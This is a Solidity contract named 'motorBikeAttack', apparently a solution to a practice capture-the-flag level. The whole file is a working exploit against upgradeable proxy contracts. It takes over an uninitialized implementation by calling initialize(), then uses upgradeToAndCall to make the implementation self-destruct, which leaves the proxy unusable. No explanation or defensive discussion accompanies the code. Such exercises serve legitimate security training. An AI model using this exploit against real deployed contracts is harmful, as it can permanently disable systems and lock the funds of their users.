// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IUpgradeable {
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
    function initialize() external;
}

contract motorBikeAttack {
    address public owner;

    event AttackSuccessful(address indexed attacker, address indexed victim);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function attack(address imp) external onlyOwner {
        require(imp != address(0), "Invalid implementation address.");

        IUpgradeable upgradeable = IUpgradeable(imp);
        upgradeable.initialize();
        bytes memory data = abi.encodeWithSignature("selfDestruct()");
        upgradeable.upgradeToAndCall(address(this), data);

        emit AttackSuccessful(msg.sender, imp);
    }

    function selfDestruct() public  {
        selfdestruct(msg.sender);
    }
}
